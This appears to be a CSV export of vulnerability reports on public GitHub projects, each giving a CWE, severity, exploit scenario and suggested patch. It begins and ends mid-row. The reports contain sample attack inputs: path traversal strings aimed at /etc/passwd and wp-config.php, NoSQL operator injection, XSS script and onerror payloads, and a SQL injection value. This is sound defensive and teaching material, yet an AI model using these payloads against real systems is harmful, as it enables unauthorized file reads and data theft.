-        expires=int(timedelta(hours=8).total_seconds()),
-    )
+    response.set_cookie(
+        key=""access_token_cookie"",
+        value=new_access_token,
+        httponly=True,
+        domain=get_learnhouse_config().hosting_config.cookie_config.domain,
+        expires=int(timedelta(hours=8).total_seconds()),
+    )

@@ async def login(...):
-    response.set_cookie(
-        key=""access_token_cookie"",
-        value=access_token,
-        httponly=False,
-        domain=get_learnhouse_config().hosting_config.cookie_config.domain,
-        expires=int(timedelta(hours=8).total_seconds()),
-    )
+    response.set_cookie(
+        key=""access_token_cookie"",
+        value=access_token,
+        httponly=True,
+        domain=get_learnhouse_config().hosting_config.cookie_config.domain,
+        expires=int(timedelta(hours=8).total_seconds()),
+    )

@@ async def third_party_login(...):
-    response.set_cookie(
-        key=""access_token_cookie"",
-        value=access_token,
-        httponly=False,
-        domain=get_learnhouse_config().hosting_config.cookie_config.domain,
-        expires=int(timedelta(hours=8).total_seconds()),
-    )
+    response.set_cookie(
+        key=""access_token_cookie"",
+        value=access_token,
+        httponly=True,
+        domain=get_learnhouse_config().hosting_config.cookie_config.domain,
+        expires=int(timedelta(hours=8).total_seconds()),
+    )
"
40,1745573566992,https://github.com/Ayobami-ANDROID/attendance-system/blob/master/routes/user.js,CWE-23,High,2025-04-25T09:32:46.000Z,2025-04-26T11:17:40.000Z,"Root Cause: The vulnerability arises because user-supplied input from an HTTP parameter is directly used to construct a file path in the download function (line 203) without sanitization. This allows attackers to inject path traversal sequences (e.g., ../).

Exploit Scenario: An attacker could craft an HTTP request with a parameter like filename=../../etc/passwd. If the server appends this to a base directory, it could resolve to a sensitive file, enabling unauthorized access to arbitrary files on the server.

Why It Happens: The code lacks input validation and path normalization. User-controlled data is trusted to form a safe filesystem path, ignoring the risk of traversal sequences manipulating the resolved path.

Security Implications: Exploitation could lead to exposure of sensitive system files (e.g., passwords, configuration files), enabling further attacks like credential theft, privilege escalation, or complete system compromise.

Suggested Fix: Sanitize the input by resolving and normalizing the path, then verifying it remains within the intended directory. For example, use os.path.abspath combined with a check that the resolved path starts with the base directory. Reject inputs containing ../ or other unsafe characters.
"
41,1745574455169,https://github.com/Ayobami-ANDROID/attendance-system/blob/master/routes/user.js,CWE-770,Medium,2025-04-25T09:47:35.000Z,2025-04-26T11:34:53.000Z,"Root Cause:
The /getallattendance endpoint generates and serves Excel files dynamically without rate-limiting. File system operations (excel file creation) are resource-intensive, and unrestricted access allows repeated requests to overload the server.

Exploit Scenario:
An attacker could automate rapid requests to /getallattendance, forcing the server to generate multiple large Excel files simultaneously. This would exhaust CPU/memory resources, causing denial-of-service for legitimate users.

Why It Happens:
The endpoint lacks safeguards to limit request frequency. Attackers can trigger expensive operations (file generation, database queries) repeatedly without throttling, exploiting the absence of rate-limiting controls.

Security Implications:
Unlimited access enables DoS attacks, degrading server performance or crashing it entirely. This disrupts service availability, impacts user trust, and may incur financial costs from infrastructure overuse.

Suggested Fix:
Implement rate-limiting using middleware like express-rate-limit to restrict requests per IP (e.g., 5 requests/minute). Cache generated files temporarily to avoid redundant operations and reduce disk I/O overhead.
New chat
"
42,1745575789738,https://github.com/Ayobami-ANDROID/voting-app/blob/master/package.json,CWE-285,Critical,2025-04-25T10:09:49.000Z,2025-04-26T11:46:49.000Z,"Root Cause: The Next.js server improperly trusts the x-middleware-subrequest header, allowing external requests to mimic internal middleware subrequests and bypass authorization checks.

Exploit Scenario: An attacker crafts an HTTP request with the x-middleware-subrequest header set. The server treats it as an internal middleware call, skipping authentication/authorization logic, granting unauthorized access to protected routes.

Why It Happens: Next.js versions in the affected range fail to validate whether the x-middleware-subrequest header originates from legitimate internal middleware processes, enabling external header spoofing.

Security Implications: Attackers can exploit this to access restricted endpoints, sensitive data, or administrative functionality, leading to data leaks, privilege escalation, or system compromise.

Suggested Fix: Upgrade the next package to a patched version (e.g., 13.5.9+) or implement a reverse proxy/edge layer to strip the x-middleware-subrequest header from external requests before reaching the Next.js app."
43,1745577519185,mohdali770409/patient-server/blob/main/recovery-story-board/controller/recovery.controller.js,"CWE-74,CWE-79,CWE-285",High,2025-04-27T14:43:54.000Z,2025-04-27T17:58:10.000Z,"Vulnerability: The application is susceptible to NoSQL Injection, Cross-Site Scripting (XSS), and unauthorized access due to improper input validation, lack of sanitization, and missing authentication mechanisms.

Why it happens (root cause): The application directly uses user input in database queries and renders output without escaping or sanitizing. Additionally, there is no validation to ensure requests are from authenticated and authorized users.

What an attacker could do if it’s exploited: An attacker could manipulate database queries to retrieve or alter unauthorized data, execute malicious scripts on the client-side, or perform unauthorized updates to sensitive records.

1. NoSQL Injection
What it is: NoSQL injection occurs when user input is directly incorporated into NoSQL database queries without proper validation or sanitization, allowing attackers to manipulate the query.

Vulnerable Code:

const recoveryUpdate = await RecoveryUpdate.findOne({ patientId: id });

Here, id is user-controlled input, and no sanitization is performed before it is used in the query.

Exploitation Example:

Attacker sends the following request:

{
  ""id"": { ""$ne"": null }
}
MongoDB interprets this query as ""find any document where patientId is not null,"" potentially exposing sensitive data.

Impact:

Unauthorized data access.

Attacker can enumerate all recovery updates or sensitive patient data.

2. Cross-Site Scripting (XSS)
What it is: XSS occurs when an application does not properly sanitize user input before displaying it in a web page, allowing malicious scripts to execute in the user's browser.

Vulnerable Code:

If the title or description fields are directly rendered in a client-side application without escaping or sanitizing:

<h1>${title}</h1>
<p>${description}</p>

Exploitation Example:

Attacker sends the following payload in title:

<script>alert('XSS');</script>

When this data is retrieved and rendered on the webpage, the script executes, leading to XSS.

Impact:

Stealing user sessions or cookies.

Defacing the website.

Spreading malware.

3. Missing Authentication/Authorization
What it is: Missing authentication/authorization allows attackers to access, modify, or delete resources without proper permissions.

Vulnerable Code:

There is no authentication or role-based access control (RBAC) implemented.

const updatedRecoveryUpdate = await RecoveryUpdate.findByIdAndUpdate(...);

Any user can send a request to modify records without verifying identity.

Exploitation Example:

Attacker makes an API call to update another user's recovery update:

{
  ""patientId"": ""victimId"",
  ""title"": ""Hacked"",
  ""description"": ""Your data has been compromised.""
}
Impact:

Unauthorized data manipulation.

Breach of confidentiality and integrity of sensitive data.


Attacker Exploitation Scenarios


1.NoSQL Injection Exploitation

Steps:

Craft a payload with an operator like $ne or $regex:

{
  ""id"": { ""$regex"": "".*"" }
}
Send this payload to the API.

Result:

The attacker retrieves all records from the database.

2.XSS Exploitation

Steps:

Submit a malicious script in the title field.

Access the web interface where this data is rendered.

Result:

The script executes in the browser of anyone viewing the page, potentially stealing session cookies.

3. Unauthorized Access Exploitation

Steps:

Identify an API endpoint for sensitive operations.

Send requests to that endpoint without an authorization token or with an unprivileged account.

Result:

The attacker can access or manipulate sensitive records.

"
44,1745577644443,https://github.com/ethanfurman/dbf/tree/master/dbf,CWE-176,Very Low,2025-04-25T17:02:09.000Z,2025-04-27T14:36:12.000Z,"Vulnerability Type: CWE-176 (Improper Handling of Unicode Encoding)

Proof of Concept:

The variables like `input_decoding` and `default_codepage` were implicitly hardcoded, relying on ASCII/UTF-8 without make use of their configuration file but setting the variables between `dbf/__init__.py` and `dbf/tables.py`.

config.py
```python
## treat non-unicode data as ...
input_decoding = 'utf-8'

## if no codepage specified on dbf creation, use this
default_codepage = 'ascii'

## default format if none specified
default_type = 'db3'

temp_dir = os.environ.get(""DBF_TEMP"") or os.environ.get(""TMP"") or os.environ.get(""TEMP"") or """"
```

dbf/tables.py
```python
temp_dir = os.environ.get(""DBF_TEMP"") or os.environ.get(""TMP"") or os.environ.get(""TEMP"") or """"
# more code...

code_pages = {
        0x00 : ('ascii', ""plain ol' ascii""),
        # more code...
        }

dbf.default_codepage = default_codepage =  code_pages.get(0x00)[0]
```

dbf/__init__.py
```python
version = 0, 99, 11, 1
# Python 2 code may need to change these
default_codepage = None     # will be set by tables module (defaults to ascii)
default_type = 'db3'        # lowest common denominator
input_decoding = 'ascii'
```

This can lead to reading and writing problems, depending on the type of information handled by the files (e.g. UTF-8 or CP1252). It is also an unfavorable design as it makes project management more difficult over time.

Severity: 1- Very Low

Root Cause: The original design scattered configuration settings (such as `default_codepage`) throughout the library. This made it difficult to manage and update these settings consistently, and it also created a dependency on hardcoded values between different files, making it harder to adapt the library in the time.

Exploit Scenario: When a user opens a DBF file with a different format from the default encoding, the library fails to properly read the text data, leading to `UnicodeEncodeError` or `UnicodeDecodeError`. This occurs with increased likelihood if a default is relied upon instead of detecting encoding per file, and making this behavior configurable.

Why It Happens: The vulnerability occurred due to a reliance on hardcoded values. It also had architectural issues because configuration wasn't centralized.

Security Implications: While not a direct security breach, the improved modularity and centralized configuration makes it easier to review the code, and lowers the likelihood of future improper configuration errors.

Suggested Fix:

1. Centralize configuration in `config.py`:

config.py
```python
diff --git a/config.py b/config.py
index 1f01a41..32edf0a 100644
--- a/config.py
+++ b/config.py
@@ -1,14 +1,25 @@
+import locale
+import os
+
 # configuration flags

 ## Flag for behavior if bad data is encountered in a logical field
 ## Return None if True, else raise BadDataError
 LOGICAL_BAD_IS_NONE = True

+version = 0, 99, 11, 1
+
+try:
+    system_encoding = locale.getpreferredencoding(False)
+    system_encoding = system_encoding.lower().replace('-', '')
+except locale.Error:
+    system_encoding = 'ascii'
+
 ## treat non-unicode data as ...
-input_decoding = 'utf-8'
+input_decoding = system_encoding

 ## if no codepage specified on dbf creation, use this
-default_codepage = 'ascii'
+default_codepage = system_encoding

 ## default format if none specified
 default_type = 'db3'
```

2. Import and use the configuration values in core library files:

dbf/__init__.py
```python
diff --git a/dbf/__init__.py b/dbf/__init__.py
index 3af869b..d150fdc 100644
--- a/dbf/__init__.py
+++ b/dbf/__init__.py
@@ -30,11 +30,14 @@ WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 """"""
-version = 0, 99, 11, 1
 # Python 2 code may need to change these
-default_codepage = None     # will be set by tables module (defaults to ascii)
-default_type = 'db3'        # lowest common denominator
-input_decoding = 'ascii'
+import config
+
+version = config.version
+input_decoding = config.input_decoding
+default_codepage = config.default_codepage
+default_type = config.default_type
+temp_dir = config.temp_dir
 
 # make dbf module importabl internally (i.e. from . import dbf)
 import sys as _sys
```

dbf/tables.py
```python
diff --git a/dbf/tables.py b/dbf/tables.py
index 9947007..ff01da0 100644
--- a/dbf/tables.py
+++ b/dbf/tables.py
@@ -53,7 +53,7 @@ class NullHandler(logging.Handler):
 logger = logging.getLogger('dbf')
 logger.addHandler(NullHandler())
 
-temp_dir = os.environ.get(""DBF_TEMP"") or os.environ.get(""TMP"") or os.environ.get(""TEMP"") or """"
+temp_dir = dbf.temp_dir
 
 # other constructs
 
@@ -5451,8 +5451,13 @@ code_pages = {
         0xf0 : ('utf8', '8-bit unicode'),
         }
 
+def _detect_codepage(cp):
+    for key, value in code_pages.items():
+        if value[0] == cp:
+            return key
+    raise DbfError(""Unsupported codepage: %s"" % cp)
 
-dbf.default_codepage = default_codepage =  code_pages.get(0x00)[0]
+default_codepage = _detect_codepage(dbf.default_codepage)
 
 def _codepage_lookup(cp):
     if cp not in code_pages:
```"
45,1745582498351,gogs/gogs,CWE-78,High,2025-04-25T16:44:39.000Z,2025-04-27T12:35:32.000Z,"Vulnerability Type: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Proof of Concept: 
In Gogs, the command to perform Git operations like cloning or updating repositories is executed using exec.Command without validating or sanitizing input arguments.
For example:
cmd := exec.Command(""git"", args...)
err := cmd.Run()
If an attacker can control the elements of `args`, they may insert malicious input that executes unintended commands via the shell.

OWASP Top 10 Category: A01:2021 – Broken Access Control

Severity: High (Level 4)

Root Cause: The Git command is constructed and executed with input that may originate from users or web interfaces, and there is no sanitization of these parameters.

Exploit Scenario: A user with administrative access to repository settings or webhook configurations could modify inputs to include malicious commands. These commands get passed to the underlying Git process, potentially allowing arbitrary code execution on the server.

Why It Happens: The exec.Command function is used without filtering or encoding input parameters from user-supplied sources. Git arguments are directly interpolated and passed to the OS.

Security Implications: Arbitrary OS command execution could result in system compromise. An attacker could use this to read sensitive data, delete repositories, or install persistent backdoors. The attack requires access to specific administrative controls, which slightly limits the exploitability.

Suggested Fix: Implement strict input validation and sanitization for all Git-related arguments. Ensure that any dynamic data passed to exec.Command is escaped and verified. Avoid using unsanitized input in OS-level commands where possible.
"
46,1745583546448,https://github.com/gocodebox/lifterlms/blob/trunk/includes/class-llms-media-protector.php,CWE-23,Critical,2025-04-25T12:19:06.000Z,2025-04-26T12:02:49.000Z,"Vulnerability Type:
CWE-22: Improper Limitation of a Pathname to a Restricted Directory (""Path Traversal"")
Proof of Concept:
Vulnerable Code Snippet:
$result = readfile( filename: $file_name ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_read_readfile
Explanation:
1.	$file_name is used directly in readfile() without sanitization.
2.	If an attacker can control $file_name, they can pass values like ../../wp-config.php.
3.	This allows unauthorized file access outside intended directories.

Severity:
High – Can result in exposure of sensitive files

Root Cause:
The input used in the readfile() function is not validated or sanitized to ensure it's restricted to a safe directory or whitelist, allowing traversal to unauthorized file paths.

Exploit Scenario:
An attacker modifies a parameter like ?file=../../wp-config.php, and the server responds by reading and serving the content of the WordPress configuration file, leaking database credentials.

Why It Happens:
Because the code assumes $file_name is safe and directly passes it to readfile(), it exposes the system to directory traversal if any user-controlled input can affect $file_name.

Security Implications:
An attacker could read any readable file on the server, such as /etc/passwd, .env, or config files, leading to credential leaks and server compromise.


Suggested Fix:
--- class-llms-media-protector.php	2025-04-25 00:00:00.000000000 +0000
+++ class-llms-media-protector.php	2025-04-25 00:00:00.000000000 +0000
@@ -210,7 +210,17 @@
-    $result = readfile( filename: $file_name ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_read_readfile
+    // Define base directory for allowed files
+    $base_dir = __DIR__ . '/protected-media/';
+    $real_path = realpath($base_dir . $file_name);
+
+    // Ensure file is within the base directory
+    if ($real_path !== false && str_starts_with($real_path, $base_dir)) {
+        $result = readfile($real_path);
+    } else {
+        http_response_code(403);
+        echo ""Access denied."";
+        exit;
+    }
"
47,1745587089046,pha123661/Online-Food-Ordering-System/blob/main/app.py,CWE-89,High,2025-04-25T13:18:09.000Z,2025-04-27T19:05:56.000Z,"The SQL query in the /search-transactionRecord route improperly uses the variable UID inside subqueries without parameterization, leading to SQL injection risk.

POC:
An attacker can craft a malicious UID parameter containing SQL code to manipulate the query, e.g., sending UID = ""1 OR 1=1"" could cause the query to return all transaction records.

Root Cause:
At line 651 in app.py:

@app.route(""/search-transactionRecord"", methods=['POST'])
def search_transactionRecord():
    UID = request.form['UID']
    db = get_db()
    rst = db.cursor().execute(
        '''
        with Shop_Name(TID, S_name) as (
                select TID, S_name 
                from Transaction_Record left join Stores
                on T_Object = S_owner
            ),
            Subj_Name(TID, Subj_name) as (
                select TID, U_name as Subj_name
                from Transaction_Record, Users
                where T_Subject = UID
            ),
            Obj_Name(TID, Obj_name) as (
                select TID, U_name as Obj_name
                from Transaction_Record, Users
                where T_Object = UID
            )
        select TID, 
            case 
                when T_action = 2 then 'Recharge'
                when T_action = 1 then 'Recieve'
                when T_action = 0 then 'Payment'
            end as Action, 
            strftime('%Y/%m/%d %H:%M', T_time) as Time,
            case
                when T_action = 2 then Subj_name
                when T_action = 1 and is_refund = 0 then Obj_name
                when T_action = 1 and is_refund = 1 then S_name
                when T_action = 0 and is_refund = 0 then S_name
                when T_action = 0 and is_refund = 1 then Obj_name
            end as Trader,
            T_amount
        from Transaction_Record natural join Subj_Name natural join Obj_Name natural join Shop_Name
        where T_Subject = ?
        ''', (UID,)
    ).fetchall()
    transaction = [{'TID': TID, 'Action': Action, 'Time': Time, 'Trader': Trader, 'T_amount': T_amount}
                   for TID, Action, Time, Trader, T_amount in rst]
    table = {'tableRow': transaction}
    print(table['tableRow'])
    response = jsonify(table)
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.status_code = 200
    return response


The subqueries use UID directly inside SQL without parameterization, which is vulnerable.

Exploit Scenario:
An attacker submits a crafted UID value containing SQL code in the POST request to /search-transactionRecord. This can lead to unauthorized data exposure or manipulation.

Why it Happens:
The UID variable is interpolated in subqueries without parameter binding. SQLite does not automatically replace UID inside subqueries with the parameter value, causing the SQL engine to treat it as a column or literal, enabling injection.

Security Implications:
Data leakage of sensitive transaction records and potential unauthorized access or modification of data.

Suggested Fix:
1. Parameterized Queries in Subqueries:
The subqueries Subj_Name and Obj_Name were directly embedding UID in the WHERE clause, leading to SQL injection. By using parameterized queries in subqueries by joining Transaction_Record with Users on T_Subject = Users.UID and T_Object = Users.UID respectively and added WHERE Users.UID = ? with UID passed as a parameter.

2.Multiple Parameters:
Because the UID is now used multiple times in the overall query (once in each of the Subj_Name and Obj_Name CTEs, and once in the final WHERE clause), you must pass it as a parameter multiple times in the execute() method.

Fixed Code: 
@app.route(""/search-transactionRecord"", methods=['POST'])
def search_transactionRecord():
    UID = request.form['UID']
    db = get_db()
    rst = db.cursor().execute(
        '''
        WITH Shop_Name(TID, S_name) AS (
            SELECT TID, S_name
            FROM Transaction_Record LEFT JOIN Stores
            ON T_Object = S_owner
        ),
        Subj_Name(TID, Subj_name) AS (
            SELECT TID, U_name AS Subj_name
            FROM Transaction_Record
            INNER JOIN Users ON Transaction_Record.T_Subject = Users.UID
            WHERE Users.UID = ?
        ),
        Obj_Name(TID, Obj_name) AS (
            SELECT TID, U_name AS Obj_name
            FROM Transaction_Record
            INNER JOIN Users ON Transaction_Record.T_Object = Users.UID
            WHERE Users.UID = ?
        )
        SELECT TID,
            CASE
                WHEN T_action = 2 THEN 'Recharge'
                WHEN T_action = 1 THEN 'Recieve'
                WHEN T_action = 0 THEN 'Payment'
            END AS Action,
            strftime('%Y/%m/%d %H:%M', T_time) AS Time,
            CASE
                WHEN T_action = 2 THEN Subj_name
                WHEN T_action = 1 AND is_refund = 0 THEN Obj_name
                WHEN T_action = 1 AND is_refund = 1 THEN S_name
                WHEN T_action = 0 AND is_refund = 0 THEN S_name
                WHEN T_action = 0 AND is_refund = 1 THEN Obj_name
            END AS Trader,
            T_amount
        FROM Transaction_Record
        NATURAL JOIN Subj_Name
        NATURAL JOIN Obj_Name
        NATURAL JOIN Shop_Name
        WHERE T_Subject = ?
        ''', (UID, UID, UID)  # Pass UID as parameter to each subquery
    ).fetchall()
    transaction = [{'TID': TID, 'Action': Action, 'Time': Time, 'Trader': Trader, 'T_amount': T_amount}
                   for TID, Action, Time, Trader, T_amount in rst]
    table = {'tableRow': transaction}
    print(table['tableRow'])
    response = jsonify(table)
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.status_code = 200
    return response
"
48,1745587136470,https://github.com/frappe/erpnext/blob/develop/.github/helper/translation.py,CWE-23,Critical,2025-04-25T13:18:56.000Z,2025-04-26T12:01:31.000Z,"Vulnerability Type: CWE-23: Path Traversal
Proof of Concept:
with open(_file) as f:
Step-by-Step Explanation:
The above line of code attempts to open a file based on user input (_file), which is passed as a command-line argument. If an attacker provides a specially crafted file path containing directory traversal sequences (e.g., ../../etc/passwd or ..\\..\\windows\\system32), the open() function will open unintended files outside of the intended directory. This could lead to unauthorized access or modification of system files.
Severity:
High
The severity is high because the vulnerability could allow an attacker to access sensitive files on the system, potentially leading to further exploitation, such as unauthorized reading, modification, or deletion of critical files.
Root Cause:
The vulnerability arises from using unvalidated user input (the file paths) directly in the open() function. Without proper checks or sanitization, an attacker can manipulate the file path to include directory traversal sequences, allowing them to escape the intended directory and access system-critical files.
Exploit Scenario:
An attacker could provide a path like ../../../../etc/passwd or ..\\..\\..\\windows\\system32\\config\\sam as one of the command-line arguments. If this input is used without sanitization in the open() function, the attacker could read system files like /etc/passwd or Windows' system files, which could contain sensitive information such as user credentials.
This could also be used as a vector for more sophisticated attacks, such as reading configuration files to gain further insights into the system, or even modifying sensitive files.
Why It Happens:
This vulnerability happens because the code directly passes user-supplied file names to the open() function without performing any sanitization or validation of the file paths. Path traversal vulnerabilities are common when user input is not strictly validated or filtered for potentially dangerous characters like ../.


Security Implications:
Exploiting this vulnerability could allow an attacker to access or manipulate system files, leading to a breach of confidentiality or integrity. In the worst-case scenario, this could lead to full system compromise, data leakage, or loss of data, depending on the system's configuration and the files an attacker is able to access. The attacker could also use this information to escalate their privileges on the system.
Suggested Fix:
--- original_script.py
+++ fixed_script.py
@@ -1,7 +1,9
 import os
 import re
 import sys
 
-errors_encounter = 0
+errors_encounter = 0

+def is_valid_file_path(file_path):
+    # Check if the file path is within the allowed directory
+    base_dir = ""/allowed/directory""
+    abs_path = os.path.abspath(file_path)
+    return abs_path.startswith(base_dir)
 
 pattern = re.compile(
     r""_\(([\""']{,3})(?P<message>((?!\1).)*)\1(\s*,\s*context\s*=\s*([\""'])(?P<py_context>((?!\5).)*)\5)*(\s*,(\s*?.*?\n*?)*(,\s*([\""'])(?P<js_context>((?!\11).)*)\11)*)*\)""
 )
 words_pattern = re.compile(r""_{1,2}\([\""'`]{1,3}.*?[a-zA-Z]"")
 start_pattern = re.compile(r""_{1,2}\([f\""'`]{1,3}"")
 f_string_pattern = re.compile(r""_\(f[\""']"")
 starts_with_f_pattern = re.compile(r""_\(f"")

 # skip first argument
 files = sys.argv[1:]
 files_to_scan = [_file for _file in files if _file.endswith(("".py"", "".js""))]

 for _file in files_to_scan:
+    if not is_valid_file_path(_file):
+        print(f""Invalid file path: {_file}"")
+        continue
     with open(_file) as f:
         print(f""Checking: {_file}"")
         file_lines = f.readlines()
         for line_number, line in enumerate(file_lines, 1):
             if ""frappe-lint: disable-translate"" in line:
                 continue
•	Sanitizing Input: A function is_valid_file_path(file_path) is introduced to check if the provided file path starts with an allowed directory (in this case, /allowed/directory).
•	Validation Before Opening: Before opening any file, the script now verifies that the file path is valid using is_valid_file_path(_file). If the path is invalid, it skips that file and prints a message indicating the invalid file path.

"
49,1745587944418,https://github.com/IvanderKendrick/Restooo-Food-Ordering-System,CWE-20,Medium,2025-04-25T13:32:24.000Z,2025-04-27T19:33:28.000Z,"Explanation:
The function addToCart(id, qty) assumes that the id passed is always valid and within the range of the foods list. However, if an invalid id (e.g., 0 or greater than length of foods) is passed, it will raise an IndexError and crash the program.

POC:
Inputting an invalid food id such as 0 or 999999 when adding to cart will cause an unhandled exception leading to crashing the program or denial of service.

Root Cause:
Line 96 in main.py.

myCart.append(Cart(foods[id -1].name, foods[id -1].price, qty))

No boundary check on id.

Exploit Scenario:
A user or attacker can input an invalid menu number such as greater then the food quantity or negative entries to crash the program.

Why it Happens:
No validation is done on the id parameter before accessing the list as compared with the length of foods.

Security Implications:
Denial of service by crashing the program. The potential crash will lead to service interruptions.

Suggested Fix:
Add validation to ensure id is within valid range before accessing foods.

def addToCart(id, qty):
    if id < 1 or id > len(foods):
        raise ValueError(""Invalid food ID"")
    myCart.append(Cart(foods[id - 1].name, foods[id - 1].price, qty))

"
50,1745595914371,mihai288/food-order-system/blob/main/kitchen_app.py,CWE-20,Medium,2025-04-25T15:45:14.000Z,2025-04-27T19:49:03.000Z,"Explanation:
The provided Python Tkinter code handles order management by reading from and writing to text files based on user input. The code lacks input validation and proper file handling safeguards, which can lead to security issues such as arbitrary file manipulation, injection attacks, and data corruption.

POC:
Entering a specially crafted order string containing newline characters or path traversal sequences (e.g., ../../somefile) in the entry widget can cause unintended file writes or deletions.
For example, entering ../../etc/passwd and submitting an order could potentially write to or remove lines from system files if the application runs with sufficient privileges.

Root Cause:
Line 27-34 in kitchen_app.py (complete_order function): Writes user input directly to ""completed_orders.txt"" and removes matching lines from ""started_orders.txt"" without sanitization.

entered_order = entry.get()
with open(""completed_orders.txt"", ""a"") as f:
    f.write(entered_order + ""\n"")
...
if value_to_remove not in line:
    file.write(line)

Exploit Scenario:
An attacker or malicious user can input crafted strings to manipulate the file system, such as injecting newline characters to add extra lines, or path traversal sequences to affect files outside the intended directory. This can lead to data loss, unauthorized file modification, or denial of service by corrupting order files.

Why it Happens:
Lack of input validation or sanitization on user inputs before writing to or modifying files.
Direct use of user input in file operations without restricting or validating content.
No error handling around file I/O operations.
Use of global mutable state (entered_order) unnecessarily complicates control flow and state management.

Security Implications:
Arbitrary file write and deletion could lead to data corruption or loss.
Potential for path traversal attacks if file paths are dynamically constructed (less likely here but still a risk if code evolves).
Injection of malicious content into order files could affect downstream processing.

Suggested Fix:
Validate and sanitize all user inputs to allow only expected characters (e.g., alphanumeric, spaces).
Avoid using global variables for user input; pass parameters explicitly.
Add error handling for file operations.
Following is the patched function:

import re

def sanitize_order(order):
    # Allow only alphanumeric and basic punctuation, strip leading/trailing spaces
    sanitized = re.sub(r'[^a-zA-Z0-9\s.,-]', '', order).strip()
    return sanitized

def complete_order():
    order = entry.get()
    sanitized_order = sanitize_order(order)
    if not sanitized_order:
        print(""Invalid order input."")
        return

    try:
        with open(""completed_orders.txt"", ""a"") as f:
            f.write(sanitized_order + ""\n"")

        file_name = ""started_orders.txt""
        with open(file_name, ""r"") as file:
            lines = file.readlines()

        with open(file_name, ""w"") as file:
            for line in lines:
                if sanitized_order not in line:
                    file.write(line)
    except IOError as e:
        print(f""File operation failed: {e}"")

"
51,1745596201767,https://github.com/warlordthesaviour/Setezor,CWE-79,Medium,2025-04-27T14:20:35.000Z,2025-04-27T14:24:40.000Z,"Vulnerability Type:
CWE-79: Improper Neutralization of Input During Web Page Generation (Stored ‘Cross-site Scripting’)

Proof of Concept:
<img src=""x"" onerror=""alert(1);"" />
This HTML snippet contains an image tag with an invalid source (x) and an onerror attribute. When the browser fails to load the image, it triggers the onerror handler, executing JavaScript code. If an application stores and later renders this user input using innerHTML without sanitizing it, the script executes in the context of another user’s session, allowing an attacker to exploit the system by injecting malicious JavaScript.

Severity:
Medium— This vulnerability allows attackers to execute arbitrary scripts in the browser, steal sensitive data such as cookies, hijack sessions, or perform malicious actions on behalf of authenticated users.

Root Cause:
The root cause is the failure to properly sanitize or escape user-controlled input before rendering it into the DOM. When the application outputs unsanitized input using methods like innerHTML, it enables attackers to inject HTML or JavaScript code. This lack of input validation and output encoding opens the door for cross-site scripting attacks, which can be exploited remotely by anyone with access to user input fields.

Exploit Scenario:
An attacker submits the payload <img src=x onerror=alert(1)> through a comment form or input field. If the server stores and later renders that input in a user-accessible page using innerHTML, every time a user visits the page, their browser interprets and executes the JavaScript inside onerror, triggering an alert. A real attack would use a script to steal session tokens or perform other unauthorized actions.

Why It Happens:
This issue occurs because the application injects unescaped user input directly into the HTML structure of a webpage. Using methods such as element.innerHTML instead of safe alternatives like textContent allows attackers to manipulate the DOM and execute scripts. The lack of proper input validation and output encoding creates a vector for attackers to embed executable scripts within the application’s front end, leading to stored or reflected XSS.

Security Implications:
If this vulnerability is successfully exploited, an attacker can execute malicious scripts in the browser of any user who views the compromised content. This can lead to session hijacking, phishing, defacement of the web application, data exfiltration, and redirection to malicious sites. It can compromise user trust and lead to regulatory and reputational damage for the affected application or organization, especially if personal data is exposed.

Suggested Fix:
Here’s how to implement the sanitize() function to protect against XSS attacks by escaping special characters:
    function sanitize(string) {
      const map = {
          '&': '&amp;',
          '<': '&lt;',
          '>': '&gt;',
          '""': '&quot;',
          ""'"": '&#x27;',
          ""/"": '&#x2F;',
      };
Before :
<h5 style=""margin-bottom: 0; word-break: break-all"">${(comment.text)}</h5>

After Fix:
<h5 style=""margin-bottom: 0; word-break: break-all"">${sanitize(comment.text)}</h5>

Sanitize all user-generated input using a reliable sanitization function that escapes HTML characters like <, >, "", and '. Use textContent instead of innerHTML where possible to avoid HTML injection. If HTML rendering is necessary, utilize a client-side library like DOMPurify to safely clean the content before injecting it into the DOM. On the server side, validate and sanitize inputs rigorously before storing or displaying them."
52,1745600699261,gogs/gogs,CWE-20,Low,2025-04-25T17:04:59.000Z,2025-04-27T12:50:51.000Z,"Vulnerability Type: CWE-20: Improper Input Validation

Proof of Concept: 
In Gogs, when creating a new repository, user input for repository names is not strictly validated. It is possible to create a repository with names that conflict with reserved system names or cause issues in backup or URL routing logic.
For example, a repository named `.` or `..` or `/admin` may interfere with system operations or URL handlers in certain deployments.

OWASP Top 10 Category: A05:2021 – Security Misconfiguration

Severity: Low (Level 2)

Root Cause: The repository name field accepts arbitrary user input without verifying that the name does not conflict with reserved words, filesystem names, or path-sensitive elements.

Exploit Scenario: A user creates a repository named `..` or `con` (on Windows). This could lead to unintended behavior during clone, backup, or deployment operations, including failures or denial of access to other features.

Why It Happens: Gogs does not sanitize or reject certain invalid or dangerous repository names. This lack of validation can lead to filesystem-level or routing conflicts.

Security Implications: Although this does not directly result in unauthorized access or data leakage, it can cause service degradation, denial-of-service, or integration problems when repositories cannot be accessed or manipulated properly.

Suggested Fix: Add validation to the repository creation endpoint to prevent the use of reserved keywords, special characters, or patterns known to cause conflicts on various filesystems and platforms."
53,1745602090590,https://github.com/gazi-allie/studynotion/blob/main/src/components/LoginForm.js,CWE-79,Medium,2025-04-25T17:28:10.000Z,2025-04-27T12:52:26.000Z,"1. Vulnerability: Cross-Site Scripting (XSS)
How Attackers Can Exploit:
The toast.success() message does not sanitize the input, and if the code dynamically inserts user-provided data (e.g., email or password) into the toast message, an attacker could inject malicious JavaScript.

Example Attack: An attacker enters <script>alert('XSS')</script> as the email. When rendered, this executes arbitrary JavaScript in the user's browser.

Mitigation:
Use input sanitization and encoding before displaying user inputs.

Use libraries like DOMPurify to sanitize user-provided inputs.

Updated Code to Mitigate XSS:

import DOMPurify from 'dompurify';

function submitHandler(event) {
    event.preventDefault();

    // Sanitize inputs before using them
    const sanitizedEmail = DOMPurify.sanitize(FormData.email);

    // Authenticate and navigate
    setIsLoggedIn(true);
    toast.success(`Welcome ${sanitizedEmail}`); // Safe display
    navigate(""/Dashboard"");
}
Why the Vulnerability occurs in the system:
